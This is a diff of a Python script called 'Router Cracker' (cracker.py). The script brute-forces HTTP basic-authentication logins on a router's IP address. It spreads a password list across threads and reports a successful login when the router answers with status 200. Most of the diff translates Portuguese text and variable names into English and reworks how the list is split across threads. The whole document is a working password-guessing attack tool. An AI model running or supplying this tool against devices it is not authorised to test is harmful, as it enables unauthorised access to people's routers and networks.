@@ -39,31 +39,32 @@ __GITHUB__  =   "https://github.com/luizfritsch"
 
 CRACKED_PASSWORD = None
 
-def divisores(num):
-    for i in range(1, int(num/2+1)):
-        if num % i == 0: 
-           yield i
-    yield num
+#	Get the max divider from password list's size
+def divider(listSize):
+    for counter in range(1, int(listSize/2+1)):
+        if listSize % counter == 0: 
+           yield counter
+    yield listSize
 
 def usage():
-	print ()
-	print ()
-	print ()
-	print ()
-	print ()
-	print ()
-	print ()
+	print ("")
+	print ("")
+	print ("")
+	print ("")
+	print ("")
+	print ("")
+	print ("")
 	print ("Usage: ")
-	print ("python cracker.py -t [TARGETs IP] -u [USER TO TEST] -p [PATH TO passwordlist] -a [QTD DE THREADS]")
+	print ("python cracker.py -t [TARGETs IP] -u [USER TO TEST] -p [PATH TO passwordlist] -a [THREAD amount]")
 	print ("")
 	print ("Example: ") 
 	print ("python cracker.py -t 192.168.0.1 -u admin -p passwordlist.txt -a 4")
-	print ()
-	print ()
-	print ()
-	print ()
+	print ("")
+	print ("")
+	print ("")
+	print ("")
 
-def bruteforce(target, passwords, username):
+def bruteforce(target, passwords, username, threadID):
 	
 	try:
 	
@@ -77,21 +78,21 @@ def bruteforce(target, passwords, username):
 			test = requests.get('http://'+target, auth=(username, password))
 			code = test.status_code
 			
-			print  ('[',i,']         USER[',username,']          PASS [',password,']')
+			print  ('THREAD[',threadID,']         USER[',username,']          PASS [',password,']')
 			
 			if code == 200:
-				print ()
+				print ("")
 				print ("==========================[LOGIN FOUNDED]==========================")
-				print ()
+				print ("")
 				print ("===================================================================")
 				print ("                 [  :: USER[",username,"] AND PASS[",password,"]  ]")
 				print ("===================================================================")
-				print ()
-				print ()
+				print ("")
+				print ("")
 				global CRACKED_PASSWORD
 				CRACKED_PASSWORD = password
-				print ()
-				print ()
+				print ("")
+				print ("")
 			
 			elif (code == 407) :
 				pass
@@ -118,25 +119,27 @@ try:
 	#Faz o parsing dos argumentos
 	parser = argparse.ArgumentParser(description = "Router Cracker", add_help = False)
 	parser.add_argument('-h', '--help', action=usage(), help='usage')
-	parser.add_argument('-t', '--target',help='Informe o ip do roteador alvo')
-	parser.add_argument('-p', '--passlist',help='Informe a lista de senhas')
-	parser.add_argument('-u','--username',help='Informe o usuário')
-	parser.add_argument('-a','--threads',help='Informe a quantidade de threads')
+	parser.add_argument('-t', '--target',help='routers ip')
+	parser.add_argument('-p', '--passlist',help='password list name')
+	parser.add_argument('-u','--username',help='username')
+	parser.add_argument('-a','--threads',help='threads amount')
 	
 	args = parser.parse_args()
 	
 	try:
 	
 		target = args.target
-		sername = args.username
-		qtdThreads = int(args.threads)	
+		username = args.username
+		threadAmount = int(args.threads)	
 	
 	except Exception as e:
-	
-		print(e)
-	
-		print ("Voce nao passou todos argumentos necessarios ou eles estão errados, por favor, execute novamente...")
-	
+		
+		print ("Error: ")
+
+		print (e)
+		
+		print ("You have not passed all the necessary arguments or they are wrong, please run it again...")
+
 		sys.exit(0)
 	
 
@@ -147,68 +150,36 @@ try:
 	passwords = fd.readlines()
 
 	#Pega a quantidade de elementos que tem na lista de senhas
-	qtdElementosNaLista = len(passwords)
+	listLength = len(passwords)
 
-	print ()
+	print ("")
 	print ("==========================[Começando]==========================")
-	print ()
+	print ("")
 		
-	#Acha os divisores
-	divisor = list(divisores(qtdElementosNaLista))
-		
-	#Acha o maior divisor, que nao seja ele mesmo
-	md = 0
-
-
-	if divisor[-1] == len(passwords):
-		
-		try:
-			
-			md = divisor[-2]	
-		
-		except Exception as e:
-			
-			print (e)
-			print ("...")
-			print ("	...")
-			print ("		...")
-			print ("	...")
-			print ("...")
-			print ("Exiting")
-			
-			sys.exit(0)
-
-	else:
-
-		md = divisor[-1]
-
 	print ()
 	print ("==========================[Dividindo e conquistando]==========================")
 	print ()
 
-	#Separa a lista em n listas, onde n = maior divisor
-	splited = [passwords[i::md] for i in range(md)]
+	
 
 	#Divide a lista em n listas, onde n = quantidade de threads
-	qtd = int(int(qtdElementosNaLista)/int(qtdThreads))
+	spliter = int(int(listLength)/int(threadAmount))
 
-	separador = 0
+	divider = 0
 
 	threads = []
 
-	for i in range(0,qtdThreads):
+	for i in range(0,threadAmount):
 		
-		arrays = passwords[separador:qtd]
+		arrays = passwords[divider:spliter]
 		
-		locals()['thread%d' % i] = threading.Thread(target=bruteforce,args=[target, arrays, username])
+		locals()['thread%d' % i] = threading.Thread(target=bruteforce,args=[target, arrays, username, i])
 		
-		separador = separador + qtd
+		divider = divider + spliter
 		
-		qtd = qtd + qtd
-
-
+		spliter = spliter + spliter
 	
-	for i in range(0,qtdThreads):
+	for i in range(0,threadAmount):
 		
 		locals()['thread%d' % i].start()
 		
@@ -220,7 +191,7 @@ try:
 	    t.join()
 	 
 	
-	print ("Finalizando execução")
+	print ("Closing the app...")
 
 except Exception as e:
 
